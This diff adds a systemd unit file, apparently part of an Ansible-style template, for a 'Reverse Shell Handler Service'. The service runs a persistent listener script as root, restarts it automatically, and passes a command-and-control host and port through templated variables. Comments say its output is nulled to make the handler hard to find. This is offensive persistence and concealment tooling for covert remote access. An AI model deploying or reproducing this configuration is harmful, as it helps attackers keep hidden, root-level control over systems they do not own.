@@ -1,0 +1,27 @@
+[Unit]
+Description=Reverse Shell Handler Service
+After=network.target
+
+[Service]
+Type=simple
+User=root
+Group=root
+ExecStart=/opt/shell-handler/persistent-listener.sh
+Restart=always
+RestartSec=10
+
+# Hide process information
+PrivateTmp=true
+ProtectSystem=full
+NoNewPrivileges=true
+
+# Make shell handler hard to find
+StandardOutput=null
+StandardError=null
+
+# Environment variables
+Environment="C2_HOST={{ c2_ip }}"
+Environment="LISTEN_PORT={{ shell_handler_port }}"
+
+[Install]
+WantedBy=multi-user.target
